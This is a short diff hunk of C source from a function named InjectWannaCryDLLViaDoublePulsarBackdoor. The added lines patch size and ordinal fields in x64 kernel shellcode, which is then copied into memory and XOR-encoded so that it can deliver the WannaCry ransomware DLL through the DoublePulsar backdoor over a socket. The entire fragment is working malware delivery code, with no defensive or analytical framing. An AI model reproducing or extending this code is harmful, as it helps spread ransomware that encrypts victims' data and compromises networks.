@@ -280,6 +280,26 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	{
 		//64 bits
 		rundll_shellcode = &x64_kernel_shellcode;
+		
+		//shellcode must be patched in 3 areas
+		/* 1.) Kernel shellcode must be updated to include the DLL size + Userland shellcode size
+		for proper allocation in memory
+		*/
+		DWORD DLL_and_UserlandShellcodeSize = 0x50D800 + 3978;
+		*(DWORD*)&x64_kernel_shellcode[0x86E] = DLL_and_UserlandShellcodeSize;
+		//x64_kernel_shellcode[2158] = 
+		
+		/* Userland shellcode DLL size len */
+		/* this value was obtained from subtracting the Userland shellcode size from the Total size of the entire shellcode
+		so...if entire shellcode size is 6144 or 0x1800
+		and if userland shellcode is 3978, then kernel shellcode size is 2166
+		*/
+		*(DWORD*)&x64_kernel_shellcode[2166+0xf82] = 0x50D800;
+		//6136
+		
+		/* Userland shellcode DLL ordinal to call */
+		*(DWORD*)&x64_kernel_shellcode[2166+0xf86] = 1; //default already set to 1
+		//6140
 	}
 	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
 	xor_payload(xkey, hMem, total_size);
